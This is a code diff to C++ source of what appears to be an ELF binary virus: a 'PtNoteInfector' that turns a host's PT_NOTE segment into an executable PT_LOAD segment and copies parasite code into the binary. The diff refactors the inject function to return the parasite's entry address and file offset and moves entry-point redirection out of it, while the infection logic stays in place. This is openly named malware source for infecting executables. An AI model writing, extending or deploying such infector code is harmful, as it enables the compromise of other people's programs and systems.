@@ -4,8 +4,6 @@
 #include "common/file_descriptor.hh"
 #include "common/macros.hh"
 #include "common/math.hh"
-#include "common/patch_pattern.hh"
-#include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
 #include "nostdlib/string.hh"
 
@@ -49,10 +47,6 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
   pt_note_to_be_infected->p_offset = virus_offset;
   pt_note_to_be_infected->p_type = PT_LOAD;
   pt_note_to_be_infected->p_flags = PF_R + PF_X;
-}
-
-void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr parasite_load_address) {
-  ehdr.e_entry = parasite_load_address;
 }
 
 }  // namespace
@@ -130,8 +124,9 @@ bool PtNoteInfector::analyze(std::span<const std::byte> host_mapping,
   return true;
 }
 
-bool PtNoteInfector::inject(std::span<std::byte> host_mapping,
-                            std::span<const std::byte> parasite_mapping) {
+std::optional<InjectionResult> PtNoteInfector::inject(
+    std::span<std::byte> host_mapping,
+    std::span<const std::byte> parasite_mapping) {
   const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
 
   const auto virus_size = parasite_mapping.size();
@@ -151,21 +146,18 @@ bool PtNoteInfector::inject(std::span<std::byte> host_mapping,
         reinterpret_cast<Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
     if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset_,
                    original_pt_note_file_offset_, parasite_load_address_)) {
-      return false;
+      return std::nullopt;
     }
-  }
-
-  {
-    auto& mutable_ehdr = reinterpret_cast<Elf64_Ehdr&>(host_mapping.front());
-    patch_ehdr(mutable_ehdr, parasite_load_address_);
   }
 
   // Inject the virus.
   vt::memcpy(&host_mapping[virus_offset_], &parasite_mapping.front(),
              parasite_mapping.size());
-  return common::redirect_elf_entry_point(
-      original_e_entry_, parasite_load_address_, virus_offset_,
-      parasite_mapping.size(), host_mapping);
+
+  return InjectionResult{
+      .parasite_entry_address = parasite_load_address_,
+      .parasite_file_offset = virus_offset_,
+  };
 }
 
 size_t PtNoteInfector::injected_host_size() {
